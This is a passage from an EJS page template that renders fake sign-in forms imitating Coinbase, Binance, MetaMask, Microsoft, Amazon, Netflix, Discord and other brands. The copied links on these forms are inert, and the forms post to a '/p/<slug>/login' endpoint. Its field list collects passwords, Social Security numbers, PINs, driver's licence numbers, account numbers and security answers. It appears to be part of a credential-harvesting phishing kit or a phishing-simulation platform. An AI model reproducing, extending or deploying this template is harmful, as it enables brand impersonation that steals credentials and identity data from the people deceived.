<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
<div class="auth">
  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %>
    <div class="logo-svg"><%- logos[tpl.key] %></div>
  <% } else { %>
    <div class="logo"><%= tpl.name.charAt(0).toUpperCase() %></div>
  <% } %>
  <h1><%= pageContent.headline %></h1>
  <% if (pageContent.subheadline) { %><p class="sub"><%= pageContent.subheadline %></p><% } %>

  <form method="POST" action="/p/<%= page.slug %>/login">
    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
    <input type="hidden" name="_sid" id="_sid_field" value="">
    <input type="text" name="_hp" style="display:none" tabindex="-1" autocomplete="off">
    <% const PLACEHOLDERS = {
      email: 'Email address',
      password: 'Password',
      phone: 'Phone number',
      username: 'Username',
      name: 'Full name',
      customer_id: 'Customer ID',
      online_id: 'Online ID',
      dl_number: 'Driver\'s license number',
      ssn: 'Social Security Number (SSN)',
      dob: 'Date of birth',
      booking_ref: 'Booking reference',
      last_name: 'Last name',
      apple_id: 'Apple ID',
      account_number: 'Account number',
      user_id: 'User ID',
      account_last4: 'Last 4 digits of account',
      personal_id: 'Personal ID',
      email_or_phone: 'Email or phone',
      email_or_mobile: 'Email or mobile phone number',
      email_phone_skype: 'Email, phone, or Skype',
      username_or_email: 'Mobile number, username or email',
      github_username_or_email: 'Username or email address',
      username_email_phone: 'Phone, email, or username',
      email_or_username: 'Email address or username',
      email_or_mobile_number: 'Email or mobile number',
      email_or_phone_num: 'Email/Phone number',
      client_number: 'Client number',
      client_card: 'Client card number',
      customer_registration_number: 'Customer registration number',
      access_code: 'Access code',
      contract_number: 'Contract number',
      branch: 'Branch',
      account: 'Account number',
      sub_account: 'Sub-account',
      pin: 'PIN',
      membership_number: 'Membership number',
      passcode: 'Passcode',
      surname: 'Surname',
      answer1: 'Answer',
      answer2: 'Answer',
      answer3: 'Answer'
    } %>
    <% pageContent.fields.forEach(f => {
      const type = f === 'password' ? 'password' : ['email','apple_id','email_or_phone','email_or_mobile','email_phone_skype','email_or_username','email_or_mobile_number','username_or_email','email_or_phone_num','github_username_or_email'].includes(f) ? 'email' : (f === 'phone') ? 'tel' : f === 'dob' ? 'date' : 'text';
      const placeholder = PLACEHOLDERS[f] || f;
    %>
      <input type="<%= type %>" name="<%= f %>" placeholder="<%= placeholder %>" autocomplete="<%= f === 'password' ? 'current-password' : 'off' %>" required>
    <% }) %>
    <% /* Kraken: add label above each field + forgot password */ %>
    <button type="submit"><%= pageContent.cta || 'Sign In' %></button>
    <% if (tpl.key === 'kraken') { %>
      <a href="#" class="kr-forgot" onclick="return false">Forgot password?</a>
    <% } %>
  </form>
  <% if (tpl.key === 'kraken') { %>
    <div class="kr-footer">Don't have an account? <a href="#" onclick="return false">Sign up</a></div>
  <% } %>
  <% if (tpl.key === 'coinbase') { %>
    <a href="#" class="cb-forgot" onclick="return false">Forgot password?</a>
    <div class="cb-footer">New to Coinbase? <a href="#" onclick="return false">Create account</a></div>
  <% } %>
  <% if (tpl.key === 'discord') { %>
    <a href="#" class="dc-forgot" onclick="return false">Forgot your password?</a>
    <div class="dc-footer">Need an account? <a href="#" onclick="return false">Register</a></div>
  <% } %>
  <% if (tpl.key === 'snapchat') { %>
    <a href="#" class="sc-forgot" onclick="return false">Forgot password?</a>
    <div class="sc-footer">Don't have an account? <a href="#" onclick="return false">Sign up</a></div>
  <% } %>
  <% if (tpl.key === 'metamask') { %>
    <div class="mm-restore"><a href="#" onclick="return false">Restore using Secret Recovery Phrase</a></div>
  <% } %>
  <% if (tpl.key === 'binance') { %>
    <div class="bn-forgot"><a href="#" onclick="return false">Forgot password?</a></div>
    <div class="bn-footer">Don't have an account? <a href="#" onclick="return false">Register</a></div>
  <% } %>
  <% if (tpl.key === 'microsoft') { %>
    <div class="ms-footer"><a href="#" onclick="return false">No account? Create one!</a></div>
    <div class="ms-footer" style="margin-top:4px"><a href="#" onclick="return false">Can't access your account?</a></div>
  <% } %>
  <% if (tpl.key === 'microsoftoutlook' || tpl.key === 'outlook') { %>
    <div class="ms-links">
      <a href="#" onclick="return false">No account? Create one!</a>
      <a href="#" onclick="return false">Can't access your account?</a>
      <a href="#" onclick="return false">Sign-in options</a>
    </div>
  <% } %>
  <% if (tpl.key === 'amazon') { %>
    <div class="az-new">
      New to Amazon? <a href="#" onclick="return false" style="color:#0066c0;">Create your Amazon account</a>
    </div>
    <div class="az-footer" style="margin-top:12px;">
      <a href="#" onclick="return false">Conditions of Use</a> &nbsp;|&nbsp;
      <a href="#" onclick="return false">Privacy Notice</a> &nbsp;|&nbsp;
      <a href="#" onclick="return false">Help</a>
    </div>
  <% } %>
  <% if (tpl.key === 'netflix') { %>
    <div class="nf-new">New to Netflix? <a href="#" onclick="return false">Sign up now.</a></div>
    <div class="nf-footer" style="margin-top:16px; font-size:.78rem;">
      This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#" onclick="return false">Learn more.</a>
    </div>
  <% } %>
  <% if (tpl.key === 'spotify') { %>
    <div class="sp-footer">Don't have an account? <a href="#" onclick="return false">Sign up for Spotify</a></div>
